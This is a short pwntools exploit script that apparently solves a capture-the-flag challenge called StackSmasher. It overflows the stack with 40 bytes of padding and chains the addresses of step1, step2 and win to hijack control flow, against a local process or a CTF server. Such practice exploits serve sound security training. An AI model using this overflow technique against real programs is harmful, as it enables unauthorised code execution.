#!/usr/bin/env python3
from pwn import *

elf = ELF("./StackSmasher")
#libc = ELF("./")
#ld = ELF("./")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hp', '70']
#context.log_level = "debug"
gs = '''
break main
'''

domain= "ctf.mf.grsu.by"
port = 9078

def start():
    if args.REMOTE:
        return remote(domain, port)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    else:
        return process([elf.path])
r = start()

#========= exploit here ===================
payload = b"A" * 40 + p64(elf.sym['step1']) + p64(elf.sym['step2']) + p64(elf.sym['win'])
r.sendlineafter(b":",payload)

r.interactive()
